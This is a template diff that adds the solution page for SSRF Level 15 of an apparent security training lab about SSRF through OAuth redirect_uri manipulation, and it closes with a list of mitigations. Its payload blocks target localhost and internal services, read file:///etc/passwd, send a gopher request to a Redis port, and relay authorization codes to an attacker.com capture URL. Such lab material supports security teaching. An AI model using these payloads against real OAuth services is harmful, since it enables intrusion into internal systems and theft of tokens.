@@ -1,0 +1,126 @@
+{% extends 'base.html' %}
+
+{% block title %}SSRF Level 15 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SSRF Level 15 Solution: SSRF in OAuth Callbacks</h2>
+            </div>
+            <div class="card-body">
+                <h3>Solution</h3>
+                <p>This challenge demonstrates SSRF vulnerabilities in OAuth callback URL validation, where redirect_uri parameters can be manipulated to target internal services.</p>
+
+                <h4>Step-by-Step Solution:</h4>
+                <ol>
+                    <li><strong>Understand OAuth flow:</strong> OAuth uses redirect_uri for callback handling</li>
+                    <li><strong>Identify validation weaknesses:</strong> Poor redirect_uri validation</li>
+                    <li><strong>Craft malicious callback:</strong> Point redirect_uri to internal services</li>
+                    <li><strong>Exploit authorization flow:</strong> Trigger SSRF during OAuth process</li>
+                </ol>
+
+                <h4>OAuth SSRF Payloads:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Basic internal service targeting
+Client ID: legitimate_client_id
+Redirect URI: http://localhost:8080/admin
+Scope: read write
+
+# Target specific internal APIs
+Client ID: test_client
+Redirect URI: http://127.0.0.1:3000/api/internal
+Scope: admin
+
+# File protocol exploitation
+Client ID: app_client
+Redirect URI: file:///etc/passwd
+Scope: read
+
+# Gopher protocol via OAuth
+Client ID: evil_client
+Redirect URI: gopher://internal.service.local:6379/_INFO
+Scope: full_access
+
+# Internal admin panels
+Client ID: trusted_app
+Redirect URI: http://admin.internal.local/oauth/callback
+Scope: admin read write</code></pre>
+                    </div>
+                </div>
+
+                <h4>OAuth SSRF Techniques:</h4>
+                <ul>
+                    <li><strong>Redirect URI manipulation:</strong> Point to internal services</li>
+                    <li><strong>Protocol smuggling:</strong> Use file://, gopher://, etc.</li>
+                    <li><strong>Subdomain takeover:</strong> Control callback domains</li>
+                    <li><strong>Open redirect chaining:</strong> Chain redirects to internal services</li>
+                </ul>
+
+                <h4>Advanced OAuth Exploitation:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># OAuth state parameter abuse
+state=http://internal.admin.local/sensitive
+
+# Authorization code interception
+redirect_uri=http://attacker.com/capture?forward=http://localhost:8080
+
+# JWT token leakage
+redirect_uri=http://internal.service.local/debug?token=
+
+# PKCE bypass with SSRF
+code_challenge=internal_service_request
+code_challenge_method=plain</code></pre>
+                    </div>
+                </div>
+
+                <h4>Tools Required:</h4>
+                <ul>
+                    <li><strong>OAuth testing tools:</strong> OAuth2 security scanners</li>
+                    <li><strong>Burp Suite OAuth extensions:</strong> OAuth flow analysis</li>
+                    <li><strong>Callback URL manipulation:</strong> Custom redirect handlers</li>
+                    <li><strong>JWT analysis tools:</strong> Token inspection and manipulation</li>
+                </ul>
+
+                <h4>Impact:</h4>
+                <ul>
+                    <li>Access to internal OAuth-protected services</li>
+                    <li>Authorization token theft and replay</li>
+                    <li>Internal API reconnaissance via OAuth flows</li>
+                    <li>Bypass of OAuth security controls</li>
+                </ul>
+
+                <h4>Real-World Examples:</h4>
+                <ul>
+                    <li><strong>GitHub OAuth SSRF:</strong> Historical redirect_uri validation issues</li>
+                    <li><strong>Google OAuth bypass:</strong> localhost callback exploitation</li>
+                    <li><strong>Facebook OAuth SSRF:</strong> Internal service access via callbacks</li>
+                    <li><strong>Microsoft OAuth issues:</strong> Azure AD callback manipulation</li>
+                </ul>
+
+                <h4>Mitigation:</h4>
+                <ul>
+                    <li>Implement strict redirect_uri allowlists</li>
+                    <li>Validate callback URLs against registered domains</li>
+                    <li>Block dangerous protocols (file://, gopher://)</li>
+                    <li>Use exact URL matching for callbacks</li>
+                    <li>Implement proper OAuth state validation</li>
+                </ul>
+
+                <div class="alert alert-danger">
+                    <h5><i class="bi bi-exclamation-triangle-fill me-2"></i>Critical Vulnerability</h5>
+                    <p class="mb-0">OAuth callback SSRF can lead to complete authentication bypass and internal service compromise. This is a high-severity vulnerability in modern applications.</p>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/ssrf/level15" class="btn btn-primary me-2">Try Challenge Again</a>
+                    <a href="/ssrf/level16" class="btn btn-success">Next Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
